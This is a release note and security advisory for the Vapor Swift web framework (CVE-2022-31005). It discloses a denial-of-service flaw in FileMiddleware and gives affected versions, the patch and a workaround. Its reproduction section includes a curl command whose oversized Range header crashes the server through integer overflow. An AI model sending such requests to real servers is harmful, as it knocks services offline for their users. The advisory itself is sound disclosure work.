‚ö†Ô∏è Security Update ‚ö†Ô∏è

This release fixes an issue where the `FileMiddleware` was vulnerable to a Denial of Service attack. Invalid range headers could cause the application to crash. If using `FileMiddleware` we recommend upgrading to this release as soon as possible. For more details see the [security advisory GHSA-vj2m-9f5j-mpr5](https://github.com/vapor/vapor/security/advisories/GHSA-vj2m-9f5j-mpr5).

This has been designated as `CVE-2022-31005`

# Denial of Service attack in Vapor's HTTP Range Request

Moderate

[0xTim](/0xTim)
published
GHSA-vj2m-9f5j-mpr5
May 31, 2022

## Package

Vapor
(SwiftPM)

## Affected versions

< 4.60.2

## Patched versions

4.60.3

## Description

### Impact

Everyone with FileMiddleware enabled is vulnerable. This is a Denial of Service attack that can crash the application

### Patches

This is patched in 4.60.3. If you are using `FileMiddleware` you should upgrade to this version.

### Workarounds

Disable FileMiddleware and serve static files via a CDN

### For more information

If you have any questions or comments about this advisory:

* Open an issue in [the Vapor repo](https://github.com/vapor/vapor)
* Ask in [Vapor Discord](http://vapor.team)

### To Reproduce

```
let file = FileMiddleware(publicDirectory: "/tmp/files")
app.middleware.use(file)

try app.run()

```

To repro, I created a directory called `/tmp/files` with a 10 MB file in it like so:

```
mkdir /tmp/files; dd if=/dev/urandom of=/tmp/files/random_10m bs=1m count=10

```

To be honest, any file of any size will do...

To reproduce the issue, it's enough to request a range like `0-9223372036854775807` and Vapor will crash (integer overflow).

```
$ curl -v -r 0-9223372036854775807 http://localhost:8080/random_10m
* Trying 127.0.0.1:8080...
* Connected to localhost (127.0.0.1) port 8080 (#0)
GET /random_10m HTTP/1.1
Host: localhost:8080
Range: bytes=0-9223372036854775807
User-Agent: curl/7.79.1
Accept: */*

* Empty reply from server
* Closing connection 0
curl: (52) Empty reply from server

```

### Severity

Moderate

### CVE ID

CVE-2022-31005

### Weaknesses

[CWE-190](/advisories?query=cwe%3A190)
